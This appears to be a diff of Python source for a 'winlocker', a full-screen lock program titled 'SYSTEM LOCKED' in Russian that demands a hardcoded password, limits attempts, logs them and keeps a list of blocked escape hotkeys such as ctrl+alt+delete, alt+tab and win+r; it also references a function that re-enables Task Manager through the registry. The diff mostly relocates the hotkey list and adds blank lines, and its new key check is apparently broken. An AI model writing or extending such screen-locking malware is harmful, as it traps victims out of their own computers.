@@ -4,6 +4,16 @@ import keyboard
 PASSWORD = "90481"
 MAX_ATTEMPTS = 3
 LOG_FILE = "winlocker.log"
+BLOCKED = [ "alt+f4","alt+tab","alt+esc","alt+space",
+    "ctrl+esc","ctrl+shift+esc","ctrl+alt+delete",
+    "win","win+d","win+r","win+l","win+tab","win+e",
+    "win+x","win+i","win+s","win+a","win+p","win+u",
+    "win+m","win+shift+m","win+space","win+up","win+down",
+    "win+left","win+right",]
+
+def is_blocked_key(event):
+    return event.unicode.lower() in BLOCKED
+
 
 def log(msg):
     try:
@@ -31,16 +41,6 @@ def enable_taskmgr():
         winreg.CloseKey(key)
     except Exception:
         pass
-
-BLOCKED = [
-    "alt+f4","alt+tab","alt+esc","alt+space",
-    "ctrl+esc","ctrl+shift+esc","ctrl+alt+delete",
-    "win","win+d","win+r","win+l","win+tab","win+e",
-    "win+x","win+i","win+s","win+a","win+p","win+u",
-    "win+m","win+shift+m","win+space","win+up","win+down",
-    "win+left","win+right",
-]
-
 
 
 
@@ -84,8 +84,10 @@ def run_locker():
             if e.type == pygame.KEYDOWN:
                 if not (field_focused and input_enabled):
                     continue
+
                 if e.key == pygame.K_ESCAPE:
                     continue
+
                 if e.key == pygame.K_RETURN:
                     if entered == PASSWORD:
                         log(f"UNLOCK: верный пароль, оставалось попыток {attempts_left}")
@@ -95,6 +97,7 @@ def run_locker():
                         attempts_left -= 1
                         log(f"FAIL: неверный пароль, осталось попыток {attempts_left}")
                         entered = ""
+
                         if attempts_left > 0:
                             word = "попытка" if attempts_left == 1 else "попытки"
                             message = f"Пароль указан неверно, осталось {attempts_left} {word}"
@@ -102,13 +105,17 @@ def run_locker():
                             message = "Попытки исчерпаны."
                             input_enabled = False
                             field_focused = False
+
                 elif e.key == pygame.K_BACKSPACE:
                     entered = entered[:-1]
+
                 else:
                     ch = e.unicode
-                    if ch.isprintable() and len(entered) < 32:
-                        entered += ch
 
+                    if ch.isprintable() and len(entered) < 32:
+                        entered += ch                
+                
+        
         screen.fill((10, 10, 14))
         title = big.render("СИСТЕМА ЗАБЛОКИРОВАНА", True, (220, 60, 60))
         screen.blit(title, (W//2 - title.get_width()//2, H//4))
